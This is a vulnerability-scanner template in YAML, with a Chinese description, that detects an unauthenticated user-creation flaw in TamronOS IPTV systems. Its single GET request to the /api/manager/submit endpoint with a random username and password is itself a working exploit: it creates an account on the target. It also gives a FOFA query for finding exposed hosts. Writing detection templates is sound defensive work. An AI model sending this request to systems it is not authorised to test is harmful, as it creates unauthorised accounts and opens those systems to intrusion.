id: tamronos-user-creation

info:
  name: TamronOS IPTV - Arbitrary User Creation
  author: pussycat0x
  severity: high
  description: |
    该模板用于检测 TamronOS IPTV - Arbitrary User Creation。该类问题通常源于服务配置过宽、调试能力暴露或安全控制未按生产环境要求启用。模板会向 `/api/manager/submit?group=1&username={{username}}&password={{password}}` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可能借助错误配置访问内部功能、敏感数据或原本不应公开的管理能力。
    - 配置缺陷常与其他漏洞组合使用，扩大暴露面并增加被定向攻击的概率。
  remediation: |
    - 按最小暴露原则收敛相关服务配置，关闭调试、示例、未使用插件和不必要接口。
    - 为管理入口和敏感接口增加认证、授权、来源限制和审计记录。
    - 复核生产环境基线，确认安全头、访问控制、默认配置和网络边界符合要求。
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/TamronOS%20IPTV%E7%B3%BB%E7%BB%9F%20submit%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="TamronOS-IPTV系统"
  tags: tamronos,misconfig,iptv,vuln
variables:
  username: "{{to_lower(rand_text_alphanumeric(6))}}"
  password: "{{rand_text_alphanumeric(12)}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/manager/submit?group=1&username={{username}}&password={{password}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"suc":true'
          - '"msg":"\u6210\u529f"'
        condition: and

      - type: word
        part: header
        words:
          - 'application/json'

      - type: status
        status:
          - 200
